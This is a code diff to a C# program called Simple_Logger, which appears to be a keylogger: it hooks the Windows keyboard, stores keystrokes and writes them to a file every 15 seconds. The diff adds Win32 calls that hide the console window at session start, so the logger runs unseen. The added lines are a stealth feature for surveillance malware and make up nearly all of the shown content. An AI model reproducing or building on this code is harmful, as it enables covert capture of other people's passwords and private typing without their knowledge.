@@ -3,12 +3,23 @@ using System.Collections.Generic;
 using System.IO;
 using System.Windows.Forms;
 using System.Reactive.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 
 namespace Simple_Logger
 {
     internal class Logger
     {
+        // DLL imports to hide console window
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        private const int SW_HIDE = 0;
+
         // Used to store key strokes
 
         public static List<string> Keys = new List<string>();
@@ -56,6 +67,11 @@ namespace Simple_Logger
 
         public static void Main()
         {
+            // Hide the console window on session start
+
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+
             var filePath = InitializeLogFile();
 
             // Write keystrokes to file every 15 seconds
@@ -67,6 +83,7 @@ namespace Simple_Logger
 
             Hook._hookId = Hook.SetHook(Hook.Proc);
             Application.Run();
+
             Hook.UnhookWindowsHookEx(Hook._hookId);
 
         }
